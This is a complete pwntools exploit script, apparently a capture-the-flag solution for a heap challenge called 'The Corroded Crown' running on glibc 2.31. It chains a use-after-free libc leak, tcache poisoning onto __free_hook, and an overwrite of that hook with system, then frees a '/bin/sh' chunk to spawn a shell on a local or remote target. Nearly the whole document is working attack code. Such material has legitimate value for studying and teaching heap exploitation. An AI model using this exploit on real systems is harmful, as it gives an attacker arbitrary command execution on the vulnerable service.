#!/usr/bin/env python3
"""
The Corroded Crown - Simpler Solution
Target: glibc 2.31 (Ubuntu 20.04)

Technique: UAF -> unsorted-bin libc leak -> direct tcache poisoning -> __free_hook -> system
1. Leak libc via unsorted bin UAF (inspect freed large chunk).
2. Allocate and free two small chunks to populate tcache.
3. UAF-corrupt the tcache head's next pointer to __free_hook.
4. Allocate twice: first pops the real chunk, second returns __free_hook.
5. Overwrite __free_hook with system.
6. Free a chunk containing "/bin/sh" to trigger shell.

NOTE: Tcache stores user-data pointers directly (not chunk addresses like fastbins),
so we poison with __free_hook directly, not __free_hook-0x10.
"""
from pwn import *
import os
import sys

context.log_level = "info"
context.arch = "amd64"

READ_INT_SIZE = 0x1f
MAX_RELIC = 0x40

cwd = os.path.dirname(os.path.abspath(__file__))


def padded_int(n):
    return str(n).encode().ljust(READ_INT_SIZE, b"\x00")


class RelicForge:
    def __init__(self, p):
        self.p = p
        self.sizes = [0] * MAX_RELIC

    def forge(self, index, size):
        self.p.send(padded_int(1))
        self.p.recvuntil(b"(index): ")
        self.p.send(padded_int(index))
        self.p.recvuntil(b"(size): ")
        self.p.send(padded_int(size))
        self.sizes[index] = size

    def inscribe(self, index, data):
        """Pad data to exact chunk size so read() doesn't slurp next command."""
        assert len(data) <= self.sizes[index]
        self.p.send(padded_int(2))
        self.p.recvuntil(b"(index): ")
        self.p.send(padded_int(index))
        self.p.recvuntil(b"bytes):\n")
        self.p.send(data.ljust(self.sizes[index], b"\x00"))

    def inspect(self, index):
        self.p.send(padded_int(3))
        self.p.recvuntil(b"(index): ")
        self.p.send(padded_int(index))
        self.p.recvuntil(b"]: ")
        data = self.p.recv(self.sizes[index])
        self.p.recv(1)  # newline
        return data

    def destroy(self, index):
        self.p.send(padded_int(4))
        self.p.recvuntil(b"(index): ")
        self.p.send(padded_int(index))


def exploit():
    if len(sys.argv) >= 3:
        p = remote(sys.argv[1], int(sys.argv[2]))
    else:
        p = process(
            [
                "setarch", "x86_64", "-R",
                "./glibc/ld-linux-x86-64.so.2",
                "--library-path", "./glibc",
                "./corroded_crown",
            ],
            cwd=cwd,
        )

    rf = RelicForge(p)
    p.recvuntil(b"> ")

    # 1. Leak libc via unsorted bin UAF
    log.info("Step 1: Leak libc")
    rf.forge(0, 0x500)
    rf.forge(1, 0x80)   # guard chunk to prevent top-chunk consolidation
    rf.inscribe(0, b"A" * 0x500)
    rf.destroy(0)

    leak = rf.inspect(0)
    libc_leak = u64(leak[:8].ljust(8, b"\x00"))
    libc_base = libc_leak - 0x1ecbe0
    __free_hook = libc_base + 0x1eee48
    system = libc_base + 0x52290
    log.info("libc base:   %s", hex(libc_base))
    log.info("__free_hook: %s", hex(__free_hook))
    log.info("system:      %s", hex(system))

    # 2. Tcache poisoning via UAF
    log.info("Step 2: Tcache poison to __free_hook")
    rf.forge(2, 0x80)
    rf.forge(3, 0x80)
    rf.destroy(2)
    rf.destroy(3)
    # tcache[0x80] -> chunk3 -> chunk2, count=2
    # Overwrite chunk3's next pointer (tcache stores user ptrs directly)
    rf.inscribe(3, p64(__free_hook))
    rf.forge(4, 0x80)   # pops chunk3
    rf.forge(5, 0x80)   # returns __free_hook

    # 3. Overwrite __free_hook with system
    log.info("Step 3: Overwrite __free_hook")
    rf.inscribe(5, p64(system))

    # 4. Trigger shell
    log.info("Step 4: Trigger shell")
    rf.forge(6, 0x80)
    rf.inscribe(6, b"/bin/sh\x00")
    rf.destroy(6)

    p.sendline(b"id")
    try:
        resp = p.recvline(timeout=2)
        if b"uid" in resp:
            log.success("Got shell!")
            p.interactive()
            return
    except EOFError:
        pass
    except Exception as e:
        log.warning("Exception: %s", e)

    log.error("Exploit failed")
    p.interactive()


if __name__ == "__main__":
    exploit()
